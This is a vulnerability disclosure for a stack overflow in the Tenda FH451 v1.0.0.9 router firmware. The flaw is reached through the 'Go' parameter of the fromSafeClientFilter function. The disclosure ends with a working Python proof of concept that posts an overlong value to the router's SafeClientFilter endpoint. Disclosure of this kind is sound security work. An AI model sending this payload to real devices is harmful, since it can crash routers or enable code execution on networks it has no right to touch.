# Tenda FH451 fromSafeClientFilter_Go
### Overview
vendor: Tenda

product: FH451

version: v1.0.0.9

type: Stack Overflow
### Vulnerability Description
Tenda FH451 v1.0.0.9 were discovered to contain a stack overflow via the Go parameter in the fromSafeClientFilter function.

### Vulnerability details
In function fromSafeClientFilter line 28, it reads in a user-provided parameter `Go`. The variable `s_1` is passed to the `strcpy` function without any length check, which may overflow the stack-based buffer `s`. As a result, by requesting the page, an attacker can easily execute a denial of service attack or remote code execution.

![](images/1.png)

```python
import requests

ip = "192.168.0.1"
url = "http://" + ip + "/goform/SafeClientFilter"

data = {
    "menufacturer": "tenda",
    "Go": "a" * 1000,
}

response = requests.post(url, data=data)
print(response.text)
```